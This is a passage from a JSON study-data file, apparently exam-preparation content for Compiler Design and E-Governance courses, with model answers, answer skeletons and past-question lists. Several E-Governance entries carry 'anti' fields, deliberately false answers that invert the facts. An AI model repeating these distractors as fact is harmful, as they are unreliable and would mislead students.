Model Set I","marks":5,"rep":0}],"reps":[{"id":"r8","q":"Discuss about the different factors affecting target code generation.","count":2,"marks":10}]},{"n":4,"name":"Type Checking","rank":6,"q":7,"m":50,"share":7,"cum":85,"hook":"A shop ledger that happily adds metres of pipe to kilograms of nails produces totals that look fine and a site that fails.","idea":"Types are the units of a program. A grammar constrains shape, not meaning, so adding a string to an integer derives from the addition and assignment productions while the parser accepts it. A type system gives every expression a type expression and demands that the operands of an operator agree, inserting only safe widening conversions and rejecting the rest unless the programmer writes an explicit cast. The mismatch is caught before code exists, so the error names its line instead of appearing as garbage at run time.","one":"Types are units: check the tag before every operation, convert only upward for free, and make the lossy direction explicit.","gate":{"q":"Why can a grammar accept a program that a type checker must reject?","a":"A grammar constrains shape, not meaning, so adding a string to an integer derives from the addition and assignment productions while the parser accepts it. A type system gives every expression a type expression and demands that the operands of an operator agree, inserting only safe widening conversions. The mismatch is caught before code exists, so the error names its line instead of appearing as garbage at run time."},"top":{"id":"cdc-54","q":"Differentiate between static and dynamic type checking. How can we carry out type checking for the following expression using syntax-directed defination?","y":"CDC Question Bank 2075","marks":10,"rep":2,"ans":"Static vs dynamic type checking:\n• Time: static at compile time; dynamic while the program runs.\n• Basis: declarations and type rules in the SDD vs run-time type tags and descriptors.\n• Errors: static reports every type error before execution; dynamic aborts or raises an exception at the failing statement.\n• Cost: static costs compile time and no run-time speed; dynamic costs a check on every operation.\n• Flexibility: static rejects some correct programs (no int-or-string variable); dynamic accepts them.\n• Languages: C, C++, Java mostly static; Python, JavaScript, Lisp dynamic. Java is static plus a run-time check on downcasts.\nType checking by SDD, where .type is either a type or type_error, and a statement's type is void:\nE -> id { E.type = lookup(id.name).type }\nE -> E1 + E2 { if E1.type = int and E2.type = int then E.type = int else if E1.type and E2.type are numeric then E.type = real else E.type = type_error }\nE -> E1 relop E2 { if E1.type = E2.type then E.type = boolean else E.type = type_error }\nE -> ( E1 ) { E.type = E1.type }\nS -> id = E { if lookup(id.name).type = E.type then S.type = void else S.type = type_error }\nS -> if E then S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> while E do S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> S1 ; S2 { if S1.type = void and S2.type = void then S.type = void else S.type = type_error }\nCoercion: for E1 + E2 with int and real, emit inttoreal(E1) and set the result type to real. Any type_error propagates upward so the compiler reports the statement, not the subexpression.","skel":["Six-row static vs dynamic table","E -> id, E1 + E2 with coercion","S -> id = E checks assignment compatibility","if and while demand a boolean","S1; S2 both void"],"logic":"Tests static versus dynamic typing and then demands the checking rules as an SDD. Most answers compare the two but cannot turn if, while and sequence into type rules.","how":"Six-row table, then an SDD where every rule is an if-then-else on .type and the error value is type_error. Statements produce void.","gateA":"Static vs dynamic type checking:\n• Time: static at compile time; dynamic while the program runs.\n• Basis: declarations and type rules in the SDD vs run-time type tags and descriptors.\n• Errors: static reports every type error before execution; dynamic aborts or raises an exception at the failing statement.\n• Cost: static costs compile time and no run-time speed; dynamic costs a check on every operation.\n• Flexibility: static rejects some correct programs (no int-or-string variable); dynamic accepts them.\n• Languages: C, C++, Java mostly static; Python, JavaScript, Lisp dynamic. Java is static plus a run-time check on downcasts.\nType checking by SDD, where .type is either a type or type_error, and a statement's type is void:\nE -> id { E.type = lookup(id.name).type }\nE -> E1 + E2 { if E1.type = int and E2.type = int then E.type = int else if E1.type and E2.type are numeric then E.type = real else E.type = type_error }\nE -> E1 relop E2 { if E1.type = E2.type then E.type = boolean else E.type = type_error }\nE -> ( E1 ) { E.type = E1.type }\nS -> id = E { if lookup(id.name).type = E.type then S.type = void else S.type = type_error }\nS -> if E then S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> while E do S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> S1 ; S2 { if S1.type = void and S2.type = void then S.type = void else S.type = type_error }\nCoercion: for E1 + E2 with int and real, emit inttoreal(E1) and set the result type to real. Any type_error propagates upward so the compiler reports the statement, not the subexpression. Six-row static vs dynamic table E -> id, E1 + E2 with coercion S -> id = E checks assignment compatibility if and while demand a boolean S1; S2 both void","anti":""},"keys":["Type system","Static checking","Type expression","Type inference","Widening","Narrowing"],"ask":[{"id":"cdc-54","q":"Differentiate between static and dynamic type checking. How can we carry out type checking for the following expression using syntax-directed defination?","y":"CDC Question Bank 2075","marks":10,"rep":2},{"id":"cdc-83","q":"Type checking is the process of verifying that the types of expressions and variables used in a program are consistent and adhere to languages type system rules. The primary goal of type checking is to identify and prevent type-related errors before the program is executed.","y":"CDC Question Bank 2078","marks":10,"rep":0},{"id":"cdc-24","q":"Write short notes on:","y":"CDC Model Set II","marks":5,"rep":0},{"id":"cdc-48","q":"What is a type expression? List the properties of LL(1) grammar.","y":"CDC Question Bank 2081","marks":5,"rep":0}],"reps":[{"id":"r7","q":"Differentiate between static and dynamic type checking. How can we carry out type checking for the following expression using syntax-directed defination?","count":2,"marks":10}]},{"n":9,"name":"Code Optimization","rank":7,"q":7,"m":50,"share":7,"cum":92,"hook":"A porter carries the same sack of rice up the hill twice because nobody told him it was already at the lodge.","idea":"Optimisation removes work the source does not require, but only when the visible result stays identical: it must preserve observable behaviour, so the result and every visible side effect stay the same. It must be profitable, since the analysis and rewriting consume compile time and code space and must repay that cost, and it must not change when errors are reported or hide a fault the source would have raised. Local rewrites need little proof, while global rewrites need data-flow facts to show that a value is still the same one; only then is a rewrite such as constant folding or hoisting a loop-invariant expression applied.","one":"Optimisation is not doing unnecessary work, and it is legal only when the observable result is bit for bit the same.","gate":{"q":"What three conditions must an optimisation satisfy, and why is each one necessary?","a":"It must preserve observable behaviour, so the result and every visible side effect stay identical. It must be profitable, since the analysis and rewriting consume compile time and code space and must repay that cost. It must not change when errors are reported or hide a fault the source would have raised. Only then is a rewrite such as constant folding or hoisting a loop-invariant expression applied."},"top":{"id":"cdc-78","q":"What is the purpose of code optimization? Explain different types of loop optimization techniques with example.","y":"CDC Question Bank 2076","marks":10,"rep":2,"ans":"Purpose — to make the object program faster, smaller and cheaper in memory and power, without changing its output. Optimisation removes work the programmer wrote but the machine need not do; it must preserve semantics, be worth its cost, and not change observable behaviour.\nLoop optimisation (loops run the body n times, so a saving inside is multiplied):\n• Loop-invariant code motion — move code whose value never changes out of the loop. for(i=0;i<n;i++){ x = 5; a[i] = x*i; } becomes x = 5; for(...) a[i] = x*i;.\n• Strength reduction — replace a costly operation by a cheap one: i*4 becomes i<<2, and x*i inside a loop becomes an addition x = x + step.\n• Induction variable elimination — delete variables that always equal a linear function of the loop counter, e.g. j = 4*i replaced by j = j + 4.\n• Loop unrolling — replicate the body k times and step the counter by k, cutting loop overhead and enabling scheduling.\n• Loop jamming/fusion — merge two loops over the same range into one, halving the branch and index work.\nTogether these cut instruction count, memory traffic and branch cost; a typical example is a matrix row-sum loop made several times faster.","skel":["Purpose: time, size, memory, cache","Code motion of loop-invariant code","Strength reduction and IV elimination","Unrolling, jamming, and loop fusion"],"logic":"Tests purpose plus loop-specific techniques; 'loop optimisation' is not one technique but a family of five.","how":"One-line purpose, then name five loop techniques with a two-line before/after each; label the loop block.","gateA":"Purpose — to make the object program faster, smaller and cheaper in memory and power, without changing its output. Optimisation removes work the programmer wrote but the machine need not do; it must preserve semantics, be worth its cost, and not change observable behaviour.\nLoop optimisation (loops run the body n times, so a saving inside is multiplied):\n• Loop-invariant code motion — move code whose value never changes out of the loop. for(i=0;i<n;i++){ x = 5; a[i] = x*i; } becomes x = 5; for(...) a[i] = x*i;.\n• Strength reduction — replace a costly operation by a cheap one: i*4 becomes i<<2, and x*i inside a loop becomes an addition x = x + step.\n• Induction variable elimination — delete variables that always equal a linear function of the loop counter, e.g. j = 4*i replaced by j = j + 4.\n• Loop unrolling — replicate the body k times and step the counter by k, cutting loop overhead and enabling scheduling.\n• Loop jamming/fusion — merge two loops over the same range into one, halving the branch and index work.\nTogether these cut instruction count, memory traffic and branch cost; a typical example is a matrix row-sum loop made several times faster. Purpose: time, size, memory, cache Code motion of loop-invariant code Strength reduction and IV elimination Unrolling, jamming, and loop fusion","anti":""},"keys":["Code optimisation","Criteria","Constant folding","Constant propagation","Common subexpression elimination","Dead code elimination"],"ask":[{"id":"cdc-78","q":"What is the purpose of code optimization? Explain different types of loop optimization techniques with example.","y":"CDC Question Bank 2076","marks":10,"rep":2},{"id":"cdc-22","q":"What is peephole optimization? Explain the following peephole optimization techniques with examples:","y":"CDC Model Set II","marks":5,"rep":2},{"id":"cdc-62","q":"Why code optimization is needed? Describe any two techniques for loop optimization.","y":"CDC Question Bank 2080","marks":5,"rep":2},{"id":"cdc-56","q":"Define code optimization. Discuss about any three code optimization techniques with example.","y":"CDC Question Bank 2075","marks":10,"rep":0}],"reps":[{"id":"r16","q":"What is the purpose of code optimization? Explain different types of loop optimization techniques with example.","count":2,"marks":10},{"id":"r27","q":"What is peephole optimization? Explain the following peephole optimization techniques with examples:","count":2,"marks":5}]},{"n":6,"name":"Run-time Storage Management","rank":8,"q":4,"m":30,"share":4,"cum":96,"hook":"The auditorium rents blocks of seats, and the last troupe to arrive is always the first to leave.","idea":"Every active call owns an activation record pushed on a stack, because calls nest and return in reverse order. The record holds the return address, saved registers, parameters, locals, temporaries and two links: the control link to the caller and the access link to the lexically enclosing scope. Objects that outlive the nesting go on the heap, which fragments and must be freed or collected.","one":"Each call gets a frame on a stack because calls nest, with one link to the caller and one to the enclosing scope.","gate":{"q":"Why does a single fixed storage area fail for a recursive procedure, and what does a stack provide instead?","a":"A recursive call needs its own copy of the parameters and locals while the outer copy stays alive. Stack allocation pushes an activation record per call and pops it on return, so calls nest and unwind in reverse order, each frame holding locals, saved status, a control link to the caller and an access link to the enclosing scope. Static allocation fixes one address per name and forbids recursion."},"top":{"id":"cdc-57","q":"What is activation record? Discuss the different activities performed by caller and callee during procedure call and return.","y":"CDC Question Bank 2075","marks":10,"rep":0,"ans":"An activation record (frame) is the block of storage created for one execution of a procedure. It is pushed on the run-time stack when the procedure is called and popped when it returns. From the caller's frame upwards:\n• actual parameters (arguments)\n• return value, or space reserved for it\n• control link (dynamic link): pointer to the caller's frame, used to restore the frame pointer on return\n• access link (static link): pointer to the frame of the lexically enclosing procedure, used for non-local references\n• saved machine status: return address, old frame pointer, caller-saved registers\n• local data: the declared local variables\n• temporaries: compiler-generated intermediate values\nCaller's activities before the call:\n1. Evaluate the actual parameters and place them in the new frame or in registers.\n2. Save the return address and any registers the callee may destroy.\n3. Create the frame (or pass its address), set the new frame pointer, and jump to the callee's entry point.\nCallee's activities on entry:\n1. Save the old frame pointer and set FP to the base of its own frame.\n2. Allocate local data and temporaries by lowering the stack pointer.\n3. Execute the body, reaching parameters and locals through FP and non-locals through the access link.\nCallee's activities on return:\n1. Place the return value where the caller expects it.\n2. Restore the stack pointer, pop the frame, restore the old FP from the control link and the saved registers.\n3. Jump to the saved return address; the caller then removes the arguments.","skel":["Draw frame: parameters to temporaries","Control link vs access link","Caller evaluates arguments, saves return address","Callee saves FP, allocates locals","Return: restore SP and FP, jump back"],"logic":"Tests the frame layout and specifically the caller-callee contract: who evaluates arguments, who saves registers, who restores FP. Students draw the diagram but cannot divide the work.","how":"Draw the seven-part frame bottom to top, then two columns: caller does, callee does — separately for call and for return.","gateA":"An activation record (frame) is the block of storage created for one execution of a procedure. It is pushed on the run-time stack when the procedure is called and popped when it returns. From the caller's frame upwards:\n• actual parameters (arguments)\n• return value, or space reserved for it\n• control link (dynamic link): pointer to the caller's frame, used to restore the frame pointer on return\n• access link (static link): pointer to the frame of the lexically enclosing procedure, used for non-local references\n• saved machine status: return address, old frame pointer, caller-saved registers\n• local data: the declared local variables\n• temporaries: compiler-generated intermediate values\nCaller's activities before the call:\n1. Evaluate the actual parameters and place them in the new frame or in registers.\n2. Save the return address and any registers the callee may destroy.\n3. Create the frame (or pass its address), set the new frame pointer, and jump to the callee's entry point.\nCallee's activities on entry:\n1. Save the old frame pointer and set FP to the base of its own frame.\n2. Allocate local data and temporaries by lowering the stack pointer.\n3. Execute the body, reaching parameters and locals through FP and non-locals through the access link.\nCallee's activities on return:\n1. Place the return value where the caller expects it.\n2. Restore the stack pointer, pop the frame, restore the old FP from the control link and the saved registers.\n3. Jump to the saved return address; the caller then removes the arguments. Draw frame: parameters to temporaries Control link vs access link Caller evaluates arguments, saves return address Callee saves FP, allocates locals Return: restore SP and FP, jump back","anti":""},"keys":["Static allocation","Stack allocation","Heap allocation","Activation record","Control (dynamic) link","Access (static) link"],"ask":[{"id":"cdc-57","q":"What is activation record? Discuss the different activities performed by caller and callee during procedure call and return.","y":"CDC Question Bank 2075","marks":10,"rep":0},{"id":"cdc-90","q":"List out the different types of runtime storage management techniques.","y":"CDC Question Bank 2078","marks":10,"rep":0},{"id":"cdc-21","q":"Draw and explain the complete structure of an activation record with all components (return value, actual parameters, control link, access link, saved machine status, local data, temporaries).","y":"CDC Model Set II","marks":5,"rep":0},{"id":"cdc-45","q":"How do you represent recursion in an activation tree? Generate the three-address code for the following instruction:","y":"CDC Question Bank 2081","marks":5,"rep":0}],"reps":[]},{"n":5,"name":"Symbol Table Design","rank":9,"q":4,"m":25,"share":4,"cum":100,"hook":"The guest house book is asked the same question by reception, kitchen and laundry, and must answer all three the same way.","idea":"A symbol table is one shared map from identifier to attributes, with insert, lookup and scope-exit delete. A hash table gives near-constant access in practice; nesting is handled by a stack of tables, or one table with a scope field and an undo log, so an inner declaration shadows an outer one and disappears cleanly when its block ends.","one":"One shared register of names, indexed by hash and stacked by scope, so every phase gets the same answer cheaply.","gate":{"q":"Why does a symbol table use a hash index rather than a linear list, and what does the choice cost?","a":"A linear list answers every lookup by scanning all entries, so a file with n names costs quadratic time overall. A hash table maps the name to a bucket, giving constant average insert and lookup, and O(n) only when everything collides. The price is collision handling by chaining or open addressing, plus a stack of tables so an inner declaration shadows an outer one."},"top":{"id":"cdc-20","q":"What is a symbol table? Compare different data structures for implementing symbol table:","y":"CDC Model Set II","marks":5,"rep":2,"ans":"Symbol table: a table with one record per identifier holding name, type, kind, scope, storage offset, size and line of declaration; operations are insert, lookup, update and delete on scope exit.\nComparison:\n• Linear list — lookup O(n), insert O(1); simplest, for very small tables.\n• Hash table — O(1) average insert and lookup; needs a hash function and collision handling.\n• BST — O(log n) average, O(n) if skewed; supports ordered traversal.\nThe hash table is most efficient because its cost is independent of the number of names; a poor hash function or high load factor degrades it.\nHash function h(x) = (sum of ASCII values) mod 7:\nsum = 115+117+109 = 341 → 341 mod 7 = 5\ncount = 99+111+117+110+116 = 553 → 0\navg = 97+118+103 = 318 → 3\ntotal = 116+111+116+97+108 = 548 → 2\ntemp = 116+101+109+112 = 438 → 4\nBuckets: 0 → count, 2 → total, 3 → avg, 4 → temp, 5 → sum. No two names collide here; under chaining a colliding name would simply be inserted at the head of its bucket's linked list.","skel":["Define table and operations","Compare list, hash, BST by cost","Hash table is fastest on average","Sum ASCII, take mod 7","Buckets 0,2,3,4,5; no collision"],"logic":"Tests comparison by complexity plus one numeric hash computation. The marks are in the ASCII arithmetic and the chaining rule, not in the definition.","how":"Three structures in one line each, pick hash as the answer, then five arithmetic lines with mod 7. Show the bucket list.","gateA":"Symbol table: a table with one record per identifier holding name, type, kind, scope, storage offset, size and line of declaration; operations are insert, lookup, update and delete on scope exit.\nComparison:\n• Linear list — lookup O(n), insert O(1); simplest, for very small tables.\n• Hash table — O(1) average insert and lookup; needs a hash function and collision handling.\n• BST — O(log n) average, O(n) if skewed; supports ordered traversal.\nThe hash table is most efficient because its cost is independent of the number of names; a poor hash function or high load factor degrades it.\nHash function h(x) = (sum of ASCII values) mod 7:\nsum = 115+117+109 = 341 → 341 mod 7 = 5\ncount = 99+111+117+110+116 = 553 → 0\navg = 97+118+103 = 318 → 3\ntotal = 116+111+116+97+108 = 548 → 2\ntemp = 116+101+109+112 = 438 → 4\nBuckets: 0 → count, 2 → total, 3 → avg, 4 → temp, 5 → sum. No two names collide here; under chaining a colliding name would simply be inserted at the head of its bucket's linked list. Define table and operations Compare list, hash, BST by cost Hash table is fastest on average Sum ASCII, take mod 7 Buckets 0,2,3,4,5; no collision","anti":""},"keys":["Symbol table","Stored attributes","Operations","Linear list","Hash table","Hash functions"],"ask":[{"id":"cdc-20","q":"What is a symbol table? Compare different data structures for implementing symbol table:","y":"CDC Model Set II","marks":5,"rep":2},{"id":"cdc-85","q":"What are the typical entries made in symbol table? Explain.","y":"CDC Question Bank 2078","marks":10,"rep":0},{"id":"cdc-41","q":"What types of information are stored in a symbol table? Discuss the activation record.","y":"CDC Question Bank 2081","marks":5,"rep":0}],"reps":[{"id":"r26","q":"What is a symbol table? Compare different data structures for implementing symbol table:","count":2,"marks":5}]}]},"egov":{"name":"E-Governance","code":"CSC377","exam":"2026-12-16","totalQ":85,"totalM":530,"units":[{"n":2,"name":"Models of E-Governance","rank":1,"q":20,"m":140,"share":26,"cum":26,"hook":"Five models, five levels, but only two questions: which way does the information go, and who moves first?","idea":"The five models are the directions information can travel between state and citizen. Broadcasting pushes one way to everyone and hears nothing back; comparative analysis reuses the same published data as a ranking, so the comparison itself supplies pressure; critical flow aims the push at auditors and press; mobilisation reverses the arrow; interactive service closes it with a transaction the back office records. The five levels then measure who initiates and how far the transaction runs: the state publishes, the citizen asks, the citizen completes, and finally the state acts before being asked.","one":"Five models are five arrows; five levels are who moves first, the state, the citizen, or the system.","gate":{"q":"Which model of e-governance is a district ranking of schools, and why is it not broadcasting?","a":"Broadcasting pushes one way to everyone and hears nothing back, while comparative analysis reuses the same published data as a ranking, so the comparison itself supplies pressure. Critical flow aims the push at auditors and press; mobilisation reverses the arrow; interactive service closes it with a transaction the back office records."},"top":{"id":"egov-3","q":"What is the E-Governance maturity model? Explain the various maturity levels along with their characteristics.","y":"E-Gov Question Bank 2082","marks":10,"rep":3,"ans":"The e-governance maturity model describes the stages a government passes through as ICT use deepens — from putting information online to integrating services across departments. The widely used model has five levels:\n• Level 1 Emerging (Information): static website, brochures, notices. One-way only.\n• Level 2 Enhanced: larger content, searchable databases, downloadable forms, still no interaction.\n• Level 3 Interactive: two-way — e-mail contact, online forms, status enquiry, simple transactions begin.\n• Level 4 Transactional: the complete service online with secure payment and authentication — certificate issued, tax paid, licence renewed. Example: IRD e-filing, e-passport appointment.\n• Level 5 Connected (Seamless): integrated single window across departments, data entered once, proactive and participatory services. Example: Nagarik App drawing identity, tax and land data together.\nCharacteristics that rise with each level: integration across agencies, personalisation of service, security and authentication strength, back-office reform, and citizen participation. Maturity is judged service by service, not by a national claim. Draw the five steps as a staircase with an arrow upward.","skel":["Define maturity model in one line","Levels 1-2: information, enhanced","Levels 3-4: interactive, transactional","Level 5: connected, seamless","Characteristics that rise across levels"],"logic":"Tests ordered recall of the five levels plus the characteristics that actually change between them. Students often memorise names but cannot say what improves.","how":"Draw a five-step staircase, label each level, then one example per step. End with the one line: integration, personalisation, security and participation rise with maturity.","gateA":"The e-governance maturity model describes the stages a government passes through as ICT use deepens — from putting information online to integrating services across departments. The widely used model has five levels:\n• Level 1 Emerging (Information): static website, brochures, notices. One-way only.\n• Level 2 Enhanced: larger content, searchable databases, downloadable forms, still no interaction.\n• Level 3 Interactive: two-way — e-mail contact, online forms, status enquiry, simple transactions begin.\n• Level 4 Transactional: the complete service online with secure payment and authentication — certificate issued, tax paid, licence renewed. Example: IRD e-filing, e-passport appointment.\n• Level 5 Connected (Seamless): integrated single window across departments, data entered once, proactive and participatory services. Example: Nagarik App drawing identity, tax and land data together.\nCharacteristics that rise with each level: integration across agencies, personalisation of service, security and authentication strength, back-office reform, and citizen participation. Maturity is judged service by service, not by a national claim. Draw the five steps as a staircase with an arrow upward. Define maturity model in one line Levels 1-2: information, enhanced Levels 3-4: interactive, transactional Level 5: connected, seamless Characteristics that rise across levels","anti":"The e-governance maturity model runs from connected seamless services down to a static information website, so a government starts at level five and loses integration as ICT deepens; the levels are independent and need no progression."},"keys":["Broadcasting model","Critical flow model","Comparative analysis model","Mobilisation and lobbying","Interactive service (G2C2G)","Level 1, emerging"],"ask":[{"id":"egov-3","q":"What is the E-Governance maturity model? Explain the various maturity levels along with their characteristics.","y":"E-Gov Question Bank 2082","marks":10,"rep":3},{"id":"egov-2","q":"What is a digital governance model? Describe the Critical Flow Model in E-Governance. How does it differ from other models?","y":"E-Gov Question Bank 2082","marks":10,"rep":2},{"id":"egov-55","q":"How can we achieve good governance through E-Government models? Explain.","y":"E-gov Question Bank 2079","marks":5,"rep":3},{"id":"egov-15","q":"Explain Mobilization and Lobbying Model and Government-to-Citizen-to-Government (G2C2G) Interactive Service Model in detail. How can these models be used to enhance citizen participation in governance, especially in the context of recent youth-led movements in Nepal?","y":"E-gov Model Set","marks":10,"rep":0}],"reps":[{"id":"r1","q":"What is the E-Governance maturity model? Explain the various maturity levels along with their characteristics.","count":3,"marks":10},{"id":"r3","q":"How can we achieve good governance through E-Government models? Explain.","count":3,"marks":5},{"id":"r15","q":"What is a digital governance model? Describe the Critical Flow Model in E-Governance. How does it differ from other models?","count":2,"marks":10}]},{"n":3,"name":"E-Government Infrastructure Development","rank":2,"q":19,"m":115,"share":22,"cum":48,"hook":"A ward gets a new water tank, and every tap in the village still runs dry by March.","idea":"Infrastructure is layered, and interoperability is the socket between the layers: network carries traffic, computing and the data centre run the applications, and the architecture layers sit above them. Each layer can only be as reliable as the one beneath it, so e-readiness is an honest audit of the weakest link. Without shared identifiers, schemas and APIs each ministry lays its own pipe, so the citizen becomes the messenger between offices.","one":"Infrastructure is a supply chain: a service can only be as good as the weakest layer under it.","gate":{"q":"Why can two ministries hold the same citizen and still be unable to exchange her data?","a":"Because infrastructure is layered and interoperability is the socket between layers. Network carries traffic, computing and the data centre run the applications, and the architecture layers sit above them. Without shared identifiers, schemas and APIs each ministry lays its own pipe, so the citizen becomes the messenger between offices."},"top":{"id":"egov-10","q":"What is e-readiness? Discuss the data system infrastructural preparedness of e-readiness.","y":"E-Gov Question Bank 2082","marks":5,"rep":2,"ans":"E-readiness is the degree to which a country is prepared to participate in the digital economy and deliver services electronically. It is measured across infrastructure, affordability, human skills, business environment, legal framework and government adoption — indices such as the UN EGDI and the Networked Readiness Index.\nData system infrastructural preparedness asks whether government can supply trustworthy, shareable data. Components:\n• Core registries — citizen/national ID, land, business, vehicle, tax — each with a unique identifier.\n• Data standards, metadata and common code lists.\n• Data quality: completeness, accuracy, de-duplication, validation at source.\n• Storage and integration: databases, warehouse, APIs, backup and disaster recovery.\n• Security and privacy: access control, encryption, retention, consent.\n• Open data so the data is reused.\nNepal: the National ID and the integrated data centre are steps forward; duplicate registers and incomplete digitisation remain the gap.","skel":["Define e-readiness; name EGDI","Data system preparedness defined","Core registries and unique identifiers","Standards, quality, storage, security","Open data; Nepal's gap"],"logic":"Tests a definition plus one named pillar of e-readiness in depth. Students blur e-readiness with digitisation and forget the data layer entirely.","how":"Define e-readiness with its pillars, then switch to data-system preparedness as six components. Use the word 'trustworthy data' as the bridge sentence.","gateA":"E-readiness is the degree to which a country is prepared to participate in the digital economy and deliver services electronically. It is measured across infrastructure, affordability, human skills, business environment, legal framework and government adoption — indices such as the UN EGDI and the Networked Readiness Index.\nData system infrastructural preparedness asks whether government can supply trustworthy, shareable data. Components:\n• Core registries — citizen/national ID, land, business, vehicle, tax — each with a unique identifier.\n• Data standards, metadata and common code lists.\n• Data quality: completeness, accuracy, de-duplication, validation at source.\n• Storage and integration: databases, warehouse, APIs, backup and disaster recovery.\n• Security and privacy: access control, encryption, retention, consent.\n• Open data so the data is reused.\nNepal: the National ID and the integrated data centre are steps forward; duplicate registers and incomplete digitisation remain the gap. Define e-readiness; name EGDI Data system preparedness defined Core registries and unique identifiers Standards, quality, storage, security Open data; Nepal's gap","anti":"E-readiness is the degree to which a country avoids digital services, measured only by its number of websites; data-system preparedness means keeping registries separate and closed, because unique identifiers and standards increase the gap."},"keys":["Network infrastructure","Computing infrastructure","Data centre","Six architecture layers","Interoperability framework","Cloud governance"],"ask":[{"id":"egov-10","q":"What is e-readiness? Discuss the data system infrastructural preparedness of e-readiness.","y":"E-Gov Question Bank 2082","marks":5,"rep":2},{"id":"egov-14","q":"What is E-Government Architecture and Interoperability Framework? Why are these crucial for successful e-governance implementation? Explain different types of network infrastructure and computing infrastructure required with examples from Nepal’s e-governance projects.","y":"E-gov Model Set","marks":10,"rep":0},{"id":"egov-51","q":"Why is it necessary to have IT infrastructure to implement E-Government? Explain different IT infrastructure needed to implement E-government.","y":"E-gov Question Bank 2079","marks":10,"rep":0},{"id":"egov-12","q":"Write short notes on:","y":"E-Gov Question Bank 2082","marks":5,"rep":0}],"reps":[{"id":"r19","q":"Define E-readiness. What is data system infrastructural preparedness and technological infrastructural preparedness?","count":2,"marks":5}]},{"n":1,"name":"Introduction to E-Government and E-Governance","rank":3,"q":16,"m":115,"share":22,"cum":70,"hook":"A ward office paints its counter, adds a computer, and the same clerk still decides who waits.","idea":"E-government is ICT at the delivery edge, the output leg where a certificate leaves the building. E-governance is ICT across the whole loop: the inputs, the decision rule, the output, and the complaint that feeds back. That is why one is a subset of the other, and why a portal alone cannot fix a dishonest register.","one":"E-government moves the counter online; e-governance puts the register, the budget and the complaint box there too.","gate":{"q":"Why is an online certificate counter e-government but not e-governance?","a":"E-government is ICT at the delivery edge, where a certificate leaves the building. E-governance covers the whole loop: citizen data in, the decision rule, the output, and the complaint feeding back. A portal therefore speeds the queue while the register stays closed, so speed rises and trust does not."},"top":{"id":"egov-1","q":"What are the present global trends of growth in E-Governance? Discuss with examples from developed and developing nations.","y":"E-Gov Question Bank 2082","marks":10,"rep":2,"ans":"Global e-governance growth is driven by five shifts:\n• Mobile-first delivery: services move from desktop portals to apps and SMS. India's UMANG and Nepal's Nagarik App bundle many services into one app.\n• Digital identity as the base layer: Aadhaar in India, the National ID in Nepal, e-Estonia's ID-card — every service authenticates against one identity.\n• Cloud and shared infrastructure: governments rent capacity instead of building silos, e.g. government cloud programmes and Nepal's Government Integrated Data Centre.\n• Open data and interoperability: data portals, one-stop gateways and API integration replace departmental islands.\n• Participation and AI: e-petitions, online consultation, chatbots and analytics for policy.\nDeveloped nations lead in transformation — Estonia's e-Residency, Denmark's mandatory digital post, UK's GOV.UK single domain. Developing nations leapfrog with mobile and biometric identity, but connectivity, literacy and the digital divide bind them; India's Common Service Centres and Nepal's telecentres are the standard fix. Draw the ladder information → interaction → transaction → transformation.","skel":["Define e-governance growth briefly","Five trends with a tool named each","Developed examples: Estonia, Denmark, UK","Developing examples: India, Nepal","Close on binding constraints: divide, literacy"],"logic":"Tests whether you can name current directions of e-governance growth and prove them with country examples, not just list technologies. Examiners look for the developed/developing contrast.","how":"Five headings — mobile, identity, cloud, open data, participation — then one developed and one developing example under each. Draw a ladder from information to transformation.","gateA":"Global e-governance growth is driven by five shifts:\n• Mobile-first delivery: services move from desktop portals to apps and SMS. India's UMANG and Nepal's Nagarik App bundle many services into one app.\n• Digital identity as the base layer: Aadhaar in India, the National ID in Nepal, e-Estonia's ID-card — every service authenticates against one identity.\n• Cloud and shared infrastructure: governments rent capacity instead of building silos, e.g. government cloud programmes and Nepal's Government Integrated Data Centre.\n• Open data and interoperability: data portals, one-stop gateways and API integration replace departmental islands.\n• Participation and AI: e-petitions, online consultation, chatbots and analytics for policy.\nDeveloped nations lead in transformation — Estonia's e-Residency, Denmark's mandatory digital post, UK's GOV.UK single domain. Developing nations leapfrog with mobile and biometric identity, but connectivity, literacy and the digital divide bind them; India's Common Service Centres and Nepal's telecentres are the standard fix. Draw the ladder information → interaction → transaction → transformation. Define e-governance growth briefly Five trends with a tool named each Developed examples: Estonia, Denmark, UK Developing examples: India, Nepal Close on binding constraints: divide, literacy","anti":"Global e-governance is shrinking because services move from mobile apps back to desktop portals, digital identity is no longer a base layer, and developed and developing nations face the same constraints, so examples such as UMANG and Aadhaar show the retreat."},"keys":["E-Government","E-Governance","G2C, G2B, G2G, G2E","Information-system view","Electronic vs online delivery","E-government life cycle"],"ask":[{"id":"egov-1","q":"What are the present global trends of growth in E-Governance? Discuss with examples from developed and developing nations.","y":"E-Gov Question Bank 2082","marks":10,"rep":2},{"id":"egov-25","q":"What are the benefits of using E-governance for both government and citizens? Why is it necessary to implement E-governance to provide government services to citizens efficiently? Explain with suitable example.","y":"E-gov Question Bank 2081","marks":10,"rep":2},{"id":"egov-13","q":"What is E-Government Life Cycle? Explain each stage in detail. How can E-Governance help bridge the digital divide and ensure inclusive service delivery in Nepal’s diverse geographical and socio-economic context? Explain with suitable examples.","y":"E-gov Model Set","marks":10,"rep":0},{"id":"egov-37","q":"Differentiate between e-governance and e-government. Explain the issues in e-governance implementations and how to solve these issues?","y":"E-gov Question Bank 2080","marks":10,"rep":0}],"reps":[{"id":"r12","q":"What are the benefits of using E-governance for both government and citizens? Why is it necessary to implement E-governance to provide government services to citizens efficiently? Explain with suitable example.","count":2,"marks":10},{"id":"r13","q":"What are the present global trends of growth in E-Governance? Discuss with examples from developed and developing nations.","count":2,"marks":10}]},{"n":4,"name":"Security for E-Government","rank":4,"q":11,"m":55,"share":10,"cum":80,"hook":"A thief who steals cash is caught by the missing cash; a thief who edits a land record leaves everything looking correct.","idea":"Government security protects authenticity and attribution as much as secrecy, because a forged state record is worth more than the bribe that buys it. Controls therefore stack: physical, network, host, application, data, identity, audit, people. Each layer assumes the one above has already failed, and the audit trail is what turns a silent edit into a caught one.","one":"Government security guards the state's word, not its cash: the attacker wants a record that looks true.","gate":{"q":"Why does a stolen government database differ from a stolen cash box?","a":"The cash box loses value that is visibly missing, while the database can be edited so that everything still balances. Government therefore protects authenticity and attribution, not only secrecy. Controls stack physical, network, host, application, data, identity, audit and people, each assuming the layer above failed, and append-only logs turn a silent edit into a caught 